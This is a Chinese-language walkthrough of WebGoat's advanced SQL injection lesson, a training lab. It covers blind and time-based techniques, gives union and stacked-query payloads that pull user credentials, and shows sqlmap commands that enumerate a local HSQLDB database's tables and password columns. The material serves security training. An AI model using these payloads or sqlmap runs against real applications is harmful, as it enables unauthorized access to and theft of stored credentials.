# SQL 注入(高级)

这一课程主要介绍了 SQL 语句连接和盲注技巧。

## 其他构造方法

SQL 的注释有：
```
/* */ 	 are inline comments
-- , # 	 are line comments

Example: Select * from users where name = 'admin' --and pass = 'pass'
```

此外，使用分号可以连接多个语句。

```
',+,||	 allows string concatenation
Char()	 strings without quotes

Example: Select * from users where name = '+char(27) or 1=1
```

还有 Union 和 Join 子句的使用。

### 盲注

普通注入往往返回了足够的错误信息。如果没有返回足够的信息，就只能开始尝试盲注。

盲注时，可以使用 `1 and 1=1` 来开始注入，如果结果和 `1` 一样，而 `1 and 1=2`没有结果时，则有注入的可能性。比如 `1 and substring(database_version(),1,1) = 2` 等。

另外有一种基于时间的盲注，例如 `article = 4; sleep(10) --` ，如果没有一点信息，则可以从这里入手。


## Task 1

根据题干发现是注入在 Name 位置，首先开始注入：

```
' or '1' = 1 --
```

得到查询的结构和一个用户名。

而后我们再构造：

```
' or 1=1 union select userid,user_name,password,null,null,null,null from user_system_data --
```

来取得答案，或者利用

```
'; select * from user_system_data --
```

## Task 2


首先：
``` bash
python sqlmap.py --cookie "JSESSIONID=E631A687C2F456BC15FD067950B3290B" -u http://127.0.0.1:8080/WebGoat/SqlInjection/challenge --data "username_reg=a1&email_reg=aaa%40bbb.ccc&password_reg=1&confirm_password_reg=1" --method "PUT"
```

返回结果发现数据库是 HSQLDB。

下面来查询当前数据库：

``` bash
python sqlmap.py --cookie "JSESSIONID=E631A687C2F456BC15FD067950B3290B" -u http://127.0.0.1:8080/WebGoat/SqlInjection/challenge --data "username_reg=a1&email_reg=aaa%40bbb.ccc&password_reg=1&confirm_password_reg=1" --method "PUT" -p "username_reg" --current-db
```

返回数据库为 `PUBLIC` 。查询表：

``` bash
python sqlmap.py --cookie "JSESSIONID=E631A687C2F456BC15FD067950B3290B" -u http://127.0.0.1:8080/WebGoat/SqlInjection/challenge --data "username_reg=a1&email_reg=aaa%40bbb.ccc&password_reg=1&confirm_password_reg=1" --method "PUT" -p "username_reg" -D 'PUBLIC' -tables
```

返回的 Tables 有：

```
[19 tables]
+-----------------------------------+
| TRANSACTI\n\n\n                   |
| USER_DATA\n\n\n\n                 |
| USER_LOGI\n                       |
| WEATHER_D\n\n\n                   |
| AUTH                              |
| CHALLENGE_USERS_6AEJCVGKYWJBWLUEP |
| EMPLOYEE                          |
| JWT_KEYS                          |
| MESSAGES                          |
| MFE_IMAGES                        |
| OWNERSHIP                         |
| PINS                              |
| PRODUCT_SYSTEM_DATA               |
| ROLES                             |
| SALARIES                          |
| SERVERS                           |
| TAN                               |
| USER_DATA                         |
| USER_SYST                         |
+-----------------------------------+
```

在猜测 USER_DATA 中数据：
```
python sqlmap.py --cookie "JSESSIONID=E631A687C2F456BC15FD067950B3290B" -u http://127.0.0.1:8080/WebGoat/SqlInjection/challenge --data "username_reg=a1&email_reg=aaa%40bbb.ccc&password_reg=1&confirm_password_reg=1" --method "PUT" -p "username_reg" -D 'PUBLIC' -T 'CHALLENGE_USERS_6AEJCVGKYWJBWLUEP' --columns
```

获得有如下字段：

```
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| password | non-numeric |
| today    | numeric     |
| userid   | non-numeric |
+----------+-------------+
```
